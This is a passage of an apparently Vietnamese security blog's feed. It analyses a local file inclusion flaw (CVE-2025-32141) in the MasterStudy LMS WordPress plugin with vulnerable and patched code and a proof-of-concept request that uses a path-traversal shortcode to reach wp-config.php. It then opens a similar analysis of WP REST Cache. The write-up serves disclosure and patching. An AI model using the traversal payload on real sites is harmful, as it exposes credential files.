1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;add_shortcode( &amp;#39;stm_lms_courses_categories&amp;#39;, &amp;#39;stm_lms_courses_categories_shortcode&amp;#39; );&#xA;function stm_lms_courses_categories_shortcode( $atts ) {&#xA;    $atts = shortcode_atts(&#xA;        array(&#xA;            &amp;#39;taxonomy&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;style&amp;#39;    =&amp;gt; &amp;#39;style_1&amp;#39;,&#xA;        ),&#xA;        $atts&#xA;    );&#xA;    ob_start();&#xA;    STM_LMS_Templates::stm_lms_load_vc_element( &amp;#39;courses_categories&amp;#39;, $atts, $atts[&amp;#39;style&amp;#39;] );&#xA;    return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, callback c·ªßa shortcode &lt;code&gt;stm_lms_courses_categories&lt;/code&gt; l·∫•y tr·ª±c ti·∫øp gi√° tr·ªã &lt;code&gt;style&lt;/code&gt; t·ª´ m·∫£ng &lt;code&gt;$atts&lt;/code&gt; v√† truy·ªÅn th·∫≥ng v√†o &lt;code&gt;STM_LMS_Templates::stm_lms_load_vc_element()&lt;/code&gt; m√† kh√¥ng c√≥ b·∫•t k·ª≥ ki·ªÉm tra hay l√†m s·∫°ch ƒë·∫ßu v√†o n√†o =&amp;gt; LFI c√≥ th·ªÉ x·∫£y ra.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;add_shortcode( &amp;#39;stm_lms_courses_categories&amp;#39;, &amp;#39;stm_lms_courses_categories_shortcode&amp;#39; );&#xA;function stm_lms_courses_categories_shortcode( $atts, $content = null, $tag = &amp;#39;&amp;#39; ) {&#xA;&#x9;$atts = shortcode_atts(&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;taxonomy&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;style&amp;#39;    =&amp;gt; &amp;#39;style_1&amp;#39;,&#xA;&#x9;&#x9;),&#xA;&#x9;&#x9;$atts,&#xA;&#x9;&#x9;$tag&#xA;&#x9;);&#xA;&#x9;$atts[&amp;#39;style&amp;#39;] = basename( sanitize_file_name( $atts[&amp;#39;style&amp;#39;] ) );&#xA;&#x9;ob_start();&#xA;&#x9;STM_LMS_Templates::stm_lms_load_vc_element( &amp;#39;courses_categories&amp;#39;, $atts, $atts[&amp;#39;style&amp;#39;] );&#xA;&#x9;return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ sanitize &lt;code&gt;$atts[&#39;style&#39;]&lt;/code&gt; b·∫±ng &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_file_name/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_file_name()&lt;/code&gt;&lt;/a&gt; ƒë√£ lo·∫°i b·ªè chu·ªói/k√Ω t·ª± kh√¥ng an to√†n =&amp;gt; ngƒÉn ch·∫∑n LFI.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public static function stm_lms_load_vc_element( $__template, $__vars = array(), $__template_name = &amp;#39;&amp;#39;, $custom_path = &amp;#39;&amp;#39; ) {&#xA;    extract( $__vars ); // phpcs:ignore WordPress.PHP.DontExtract&#xA;    $element = self::stm_lms_locate_vc_element( $__template, $__template_name, $custom_path );&#xA;    if ( ! file_exists( $element ) &amp;amp;&amp;amp; strpos( $__template_name, &amp;#39;style_&amp;#39; ) !== false ) {&#xA;        $element = str_replace( $__template_name, &amp;#39;style_1&amp;#39;, $element );&#xA;    }&#xA;    if ( file_exists( $element ) ) {&#xA;        include $element;&#xA;    } else {&#xA;        echo esc_html__( &amp;#39;Element not found in&amp;#39;, &amp;#39;masterstudy-lms-learning-management-system&amp;#39; );&#xA;        echo esc_html( &amp;#39; &amp;#39; . $element );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;include()&lt;/code&gt; t·∫°i ƒë√¢y d√πng bi·∫øn &lt;code&gt;$element&lt;/code&gt; do &lt;code&gt;stm_lms_locate_vc_element()&lt;/code&gt; tr·∫£ v·ªÅ v√† &lt;code&gt;$__template_name&lt;/code&gt; (t·ª©c gi√° tr·ªã &lt;code&gt;style&lt;/code&gt; t·ª´ shortcode) ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp t·ªõi k·∫øt qu·∫£ ƒë√≥. N·∫øu &lt;code&gt;style&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c x√°c th·ª±c, attacker c√≥ th·ªÉ √©p &lt;code&gt;include&lt;/code&gt; file t√πy √Ω d·∫´n ƒë·∫øn LFI.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function stm_lms_locate_vc_element( $templates, $template_name = &amp;#39;&amp;#39;, $custom_path = &amp;#39;&amp;#39; ) {&#xA;    $located = false;&#xA;&#xA;    foreach ( (array) $templates as $template ) {&#xA;&#xA;        $folder = $template;&#xA;&#xA;        if ( ! empty( $template_name ) ) {&#xA;            $template = $template_name;&#xA;        }&#xA;&#xA;        if ( substr( $template, -4 ) !== &amp;#39;.php&amp;#39; ) {&#xA;            $template .= &amp;#39;.php&amp;#39;;&#xA;        }&#xA;&#xA;        if ( empty( $custom_path ) ) {&#xA;            $located = locate_template( &amp;#39;partials/vc_parts/&amp;#39; . $folder . &amp;#39;/&amp;#39; . $template );&#xA;            if ( ! ( $located ) ) {&#xA;                $located = STM_LMS_PATH . &amp;#39;/includes/shortcodes/partials/&amp;#39; . $folder . &amp;#39;/&amp;#39; . $template;&#xA;            }&#xA;        } else {&#xA;            $located = locate_template( $custom_path );&#xA;            if ( ! ( $located ) ) {&#xA;                $located = STM_LMS_PATH . &amp;#39;/&amp;#39; . $custom_path . &amp;#39;.php&amp;#39;;&#xA;            }&#xA;        }&#xA;&#xA;        if ( file_exists( $template_name ) ) {&#xA;            break;&#xA;        }&#xA;    }&#xA;&#xA;    return apply_filters( &amp;#39;stm_lms_locate_vc_element&amp;#39;, $located, $templates );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;stm_lms_locate_vc_element()&lt;/code&gt; c√≥ nhi·ªám v·ª• x√°c ƒë·ªãnh v√† tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n file template (&lt;code&gt;.php&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu c√≥ &lt;code&gt;$template_name&lt;/code&gt;, n√≥ s·∫Ω &lt;strong&gt;ghi ƒë√® t√™n template m·∫∑c ƒë·ªãnh&lt;/strong&gt; v√† ƒë·∫£m b·∫£o t√™n file c√≥ ph·∫ßn m·ªü r·ªông &lt;code&gt;.php&lt;/code&gt;. T√™n file s·∫Ω l√†&lt;code&gt;STM_LMS_PATH/includes/shortcodes/partials/{folder}/{template}.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;V√≠ d·ª• v·ªõi &lt;code&gt;style=payload&lt;/code&gt; th√¨ &lt;code&gt;stm_lms_locate_vc_element()&lt;/code&gt; s·∫Ω tr·∫£ v·ªÅ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/srv/www/wordpress/wp-content/plugins/masterstudy-lms-learning-management-system/_core/includes/shortcodes/partials/courses_categories/payload.php&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o post v·ªõi shortcode c√≥ attribute &lt;code&gt;style&lt;/code&gt; ch·ª©a LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/wp/v2/posts/260?_locale=user HTTP/1.1&#xA;Host: localhost&#xA;&#xA;{&amp;#34;id&amp;#34;:260,&amp;#34;content&amp;#34;:&amp;#34;&amp;lt;!-- wp:shortcode --&amp;gt;\n[stm_lms_courses_categories taxonomy=x style=../../../../../../../../wp-config]\n&amp;lt;!-- /wp:shortcode --&amp;gt;\n\n&amp;lt;!-- wp:paragraph --&amp;gt;\n&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;\n&amp;lt;!-- /wp:paragraph --&amp;gt;&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;K·∫øt qu·∫£&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Debugger ƒë√£ nh·∫£y ƒë·∫øn &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-21-cve-2025-32141/result.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ LFI th√†nh c√¥ng&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ LFI th√†nh c√¥ng&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phi√™n b·∫£n &lt;strong&gt;‚â§ 3.5.28&lt;/strong&gt; c·ªßa MasterStudy LMS cho ph√©p LFI qua tham s·ªë &lt;code&gt;style&lt;/code&gt; trong shortcode do kh√¥ng ki·ªÉm tra ƒë·∫ßu v√†o tr∆∞·ªõc khi &lt;code&gt;include&lt;/code&gt; file. B·∫£n v√° &lt;strong&gt;3.5.29&lt;/strong&gt; ƒë√£ l√†m s·∫°ch gi√° tr·ªã n√†y b·∫±ng &lt;code&gt;sanitize_file_name()&lt;/code&gt; v√† &lt;code&gt;basename()&lt;/code&gt;, ngƒÉn ch·∫∑n vi·ªác truy c·∫≠p file ngo√†i √Ω mu·ªën.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng bao gi·ªù gh√©p tr·ª±c ti·∫øp input ng∆∞·ªùi d√πng v√†o ƒë∆∞·ªùng d·∫´n file.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n sanitize ho·∫∑c gi·ªõi h·∫°n gi√° tr·ªã b·∫±ng whitelist tr∆∞·ªõc khi &lt;code&gt;include&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;X√°c th·ª±c ƒë∆∞·ªùng d·∫´n th·ª±c t·∫ø ƒë·ªÉ ƒë·∫£m b·∫£o file n·∫±m trong th∆∞ m·ª•c h·ª£p l·ªá.&lt;/li&gt;&#xA;&lt;li&gt;C·∫≠p nh·∫≠t l√™n &lt;strong&gt;v3.5.29&lt;/strong&gt; ƒë·ªÉ lo·∫°i b·ªè l·ªó h·ªïng LFI.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/masterstudy-lms-learning-management-system/vulnerability/wordpress-masterstudy-lms-plugin-3-5-23-local-file-inclusion-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress MasterStudy LMS Plugin &amp;lt;= 3.5.28 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-52716 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-20-cve-2025-52716/</link>
      <pubDate>Mon, 20 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-20-cve-2025-52716/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-20-cve-2025-52716/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;WP REST Cache&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;‚â§ 2025.1.0&lt;/strong&gt; ch·ª©a l·ªó h·ªïng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh &lt;code&gt;include/require&lt;/code&gt;, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-52716&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-52716&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2025.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2025.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-rest-cache/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP REST Cache Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;WP REST Cache&lt;/strong&gt;: &lt;strong&gt;2025.1.0&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;2025.1.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 